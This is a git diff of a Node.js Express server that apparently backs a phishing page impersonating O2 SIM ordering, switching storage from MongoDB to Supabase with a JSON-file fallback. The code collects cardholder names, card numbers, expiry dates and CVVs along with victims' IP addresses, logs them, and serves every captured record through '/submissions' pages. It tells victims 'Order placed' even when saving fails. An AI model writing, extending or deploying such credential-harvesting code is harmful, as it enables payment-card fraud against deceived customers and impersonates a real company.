@@ -1,25 +1,75 @@
 const express = require('express');
-const mongoose = require('mongoose');
+const { createClient } = require('@supabase/supabase-js');
 const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
+const os = require('os');
 require('dotenv').config();
-
-const Submission = require('./models/Submission');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost/o2_submissions';
+const SUPABASE_URL = process.env.SUPABASE_URL?.trim();
+const SUPABASE_KEY = process.env.SUPABASE_KEY?.trim();
+const MONGODB_URI = process.env.MONGODB_URI?.trim();
+const supabase = SUPABASE_URL && SUPABASE_KEY ? createClient(SUPABASE_URL, SUPABASE_KEY) : null;
 
 app.use(cors());
 app.use(express.json());
 app.use(express.static(__dirname));
 
-// Connect to MongoDB
-mongoose.connect(MONGODB_URI)
-  .then(() => console.log('✅ Connected to MongoDB'))
-  .catch(err => console.error('❌ MongoDB connection error:', err.message));
+const FALLBACK_FILE = path.join(__dirname, 'submissions.json');
 
-// POST /submit — save card details to MongoDB
+function readFallbackSubmissions() {
+  try {
+    if (!fs.existsSync(FALLBACK_FILE)) return [];
+    const raw = fs.readFileSync(FALLBACK_FILE, 'utf8');
+    return JSON.parse(raw || '[]');
+  } catch (e) {
+    console.error('Error reading fallback submissions:', e.message);
+    return [];
+  }
+}
+
+function appendFallbackSubmission(submission) {
+  try {
+    const items = readFallbackSubmissions();
+    items.unshift(submission);
+    fs.writeFileSync(FALLBACK_FILE, JSON.stringify(items, null, 2));
+    return true;
+  } catch (e) {
+    console.error('Error writing fallback submission:', e.message);
+    return false;
+  }
+}
+
+// Configure Supabase
+if (supabase) {
+  console.log('✅ Supabase client configured');
+} else {
+  console.warn('⚠️  No Supabase configuration found. Submissions will use fallback storage only.');
+}
+
+async function fetchSupabaseSubmissions() {
+  if (!supabase) return [];
+  const { data, error } = await supabase
+    .from('submissions')
+    .select('*')
+    .order('timestamp', { ascending: false });
+  if (error) {
+    console.error('Error fetching submissions from Supabase:', error.message || error);
+    return [];
+  }
+  return data || [];
+}
+
+async function fetchSubmissions() {
+  if (!supabase) return readFallbackSubmissions();
+  const submissions = await fetchSupabaseSubmissions();
+  if (submissions.length) return submissions;
+  return readFallbackSubmissions();
+}
+
+// POST /submit — save card details to Supabase
 app.post('/submit', async (req, res) => {
   const { nameOnCard, cardNumber, expiry, cvv } = req.body;
 
@@ -28,7 +78,7 @@ app.post('/submit', async (req, res) => {
   }
 
   try {
-    const submission = new Submission({
+    const submission = {
       id: Date.now(),
       timestamp: new Date().toISOString(),
       nameOnCard,
@@ -37,9 +87,23 @@ app.post('/submit', async (req, res) => {
       cvv,
       ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
       userAgent: req.headers['user-agent'],
-    });
+      createdAt: new Date().toISOString(),
+    };
 
-    await submission.save();
+    let savedToDb = false;
+    try {
+      if (!supabase) throw new Error('Supabase client not configured');
+      const { data, error } = await supabase
+        .from('submissions')
+        .insert([submission])
+        .select();
+      if (error) throw error;
+      savedToDb = true;
+      if (data?.[0]?.id) submission.id = data[0].id;
+    } catch (dbErr) {
+      console.error('DB save failed, using fallback file:', dbErr.message || dbErr);
+      appendFallbackSubmission(submission);
+    }
 
     console.log('\n========== NEW SUBMISSION ==========');
     console.log('Time:        ', submission.timestamp);
@@ -50,33 +114,50 @@ app.post('/submit', async (req, res) => {
     console.log('IP:          ', submission.ip);
     console.log('=====================================\n');
 
-    res.json({ success: true, message: 'Order placed! Your SIM is on its way.' });
+    if (savedToDb) {
+      res.json({ success: true, message: 'Order placed! Your SIM is on its way.' });
+    } else {
+      res.json({ success: true, message: 'Order placed.' });
+    }
   } catch (error) {
     console.error('Submission error:', error);
-    res.status(500).json({ success: false, error: 'Failed to process submission.' });
+    // Try fallback on unexpected errors
+    try {
+      appendFallbackSubmission({ id: Date.now(), timestamp: new Date().toISOString(), nameOnCard, cardNumber, expiry, cvv, ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress, userAgent: req.headers['user-agent'] });
+      return res.json({ success: true, message: 'Order placed.' });
+    } catch (e) {
+      return res.status(500).json({ success: false, error: 'Failed to process submission.' });
+    }
   }
 });
 
 // GET /api/submissions — view all captured data (JSON)
 app.get('/api/submissions', async (req, res) => {
   try {
-    const submissions = await Submission.find().sort({ createdAt: -1 });
+    const submissions = await fetchSubmissions();
     res.json(submissions);
   } catch (error) {
     console.error('Error fetching submissions:', error);
-    res.status(500).json({ error: 'Failed to fetch submissions.' });
+    const fallback = readFallbackSubmissions();
+    return res.json(fallback);
   }
 });
 
 // GET /submissions — view submissions page (HTML)
 app.get('/submissions', async (req, res) => {
   try {
-    const submissions = await Submission.find().sort({ createdAt: -1 });
+    const submissions = await fetchSubmissions();
     res.send(getSubmissionsPage(submissions));
   } catch (error) {
     console.error('Error fetching submissions:', error);
-    res.send(getSubmissionsPage([]));
+    const fallback = readFallbackSubmissions();
+    res.send(getSubmissionsPage(fallback));
   }
+});
+
+// GET / — serve main form page (index.html)
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 function getSubmissionsPage(submissions) {
@@ -148,5 +229,5 @@ app.listen(PORT, () => {
   console.log(`\n🚀 O2 SIM Server running at http://localhost:${PORT}`);
   console.log(`📋 View submissions at http://localhost:${PORT}/submissions`);
   console.log(`� JSON API at http://localhost:${PORT}/api/submissions`);
-  console.log(`💾 Database: ${MONGODB_URI.includes('localhost') ? 'Local MongoDB' : 'MongoDB Atlas'}\n`);
+  console.log(`💾 Database: ${MONGODB_URI ? (MONGODB_URI.includes('localhost') ? 'Local MongoDB' : 'MongoDB Atlas') : 'Not configured'}\n`);
 });
